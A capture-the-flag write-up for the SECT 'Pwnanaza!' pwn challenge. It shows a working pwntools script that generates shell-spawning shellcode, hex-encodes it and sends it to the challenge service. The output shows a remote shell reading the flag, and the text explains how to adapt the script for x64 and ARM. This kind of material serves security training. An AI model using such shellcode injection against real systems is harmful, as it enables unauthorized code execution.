**Pwnanaza! - Pwn (100)**

We have captured three androids. Use them to practice your pwning.

nc pwn2.sect.ctf.rocks 3000
nc pwn2.sect.ctf.rocks 3001
nc pwn2.sect.ctf.rocks 3002
[pwnanaza.tar.gz](https://www.dropbox.com/s/9ih9mgjrirf6can/pwnanaza.tar.gz?dl=1)


Solves: 26

Author: @likvidera


The file contains the three binaries *pwn_x86*, *pwn_x64* and *pwn_arm32*
which are the binaries you interact with when connecting to the ports.

No reverse engineering is needed, just do what the binary tells you:

./pwn_x86
[*] Intel-x86 Module
[!] Enter your hex-encoded shellcode:

So it wants a *hex-encoded* shellcode. The easiest way to send
shellcode to a port is with [pwntools](https://docs.pwntools.com/en/stable/).

Pwntools has a function **shellcraft.sh()** that generates assembly code
for a shellcode that gives a shell. To actually get the binary
shellcode assemble it with the **asm()** function from pwntools. Use the
**context()** function to specify architecture and OS.

Now it told us to give it hex-encoded shellcode, so use the **enhex()**
function on each byte in the shellcode and send the result. If
succesful the **interactive()** function should let you interact with the shell.


```python
from pwn import *

context(arch = 'i386', os = 'linux')

host = 'pwn2.sect.ctf.rocks'
port = 3000

conn = remote(host, port)
lines = conn.recvuntil('shellcode:')
print lines

asmshellcode = shellcraft.sh()
shellcode = asm(asmshellcode)
s = ''
for b in shellcode:
    s += enhex(b)

conn.send(s + '\r\n')

conn.interactive()
conn.close()
```

And run it:

	$ python pwn.py
	[+] Opening connection to pwn2.sect.ctf.rocks on port 3000: Done
	[*] Intel-x86 Module
	[!] Enter your hex-encoded shellcode:
	[+] Running your shellcode!

	[*] Switching to interactive mode
	$ ls
	flag
	pwn_x86
	$ cat flag
	SECT{f0LL
	$  

That gives the first third of the flag. Repeat for x64, just replace
the port number and replace *arch = 'i386'* with *arch = 'amd64'*. Lastly arm32 wants
**context(arch = 'arm', bits = 32, os = 'linux')**.

Pwntools really is the shit for these kind of challs.
